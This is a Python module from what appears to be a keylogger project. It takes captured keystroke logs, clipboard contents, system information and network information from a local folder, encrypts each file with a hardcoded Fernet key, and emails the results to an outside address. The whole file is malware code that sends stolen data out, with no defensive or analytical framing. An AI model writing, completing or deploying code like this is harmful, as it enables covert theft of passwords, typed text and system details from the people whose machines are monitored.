from functions.send_email_log import send_email, toadrr
from cryptography.fernet import Fernet

file_path = "C:\\Users\\PC-Service\\OneDrive\\Desktop\\project\\files\\"
encrypted_file_path = "C:\\Users\\PC-Service\\OneDrive\\Desktop\\project\\encrypted_files\\"

keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
network_information = "network_info.txt"

files_to_encrypt = [ file_path + keys_information, 
                    file_path + system_information,
                    file_path + clipboard_information,
                    file_path + network_information ]

keys_information_e = "key_log_e.txt"
system_information_e = "system_info_e.txt"
clipboard_information_e = "clipboard_e.txt"
network_information_e = "network_info_e.txt"

encrypted_files_names = [keys_information_e, 
                         system_information_e, 
                         clipboard_information_e, 
                         network_information_e]

encrypted_files = [ encrypted_file_path + keys_information_e,
                   encrypted_file_path + system_information_e,
                   encrypted_file_path + clipboard_information_e,
                   encrypted_file_path + network_information_e]

key = "tT2M0xwaxM-ceVtoFXQFCpenQwWcSCvaqQd1IFRxn1w="

def encrypt_log_files():
    count = 0

    while count < len(files_to_encrypt):
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()
    
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        with open(encrypted_files[count], 'wb') as f:
            f.write(encrypted_data)

        send_email(encrypted_files_names[count], encrypted_files[count], toadrr)
        count += 1
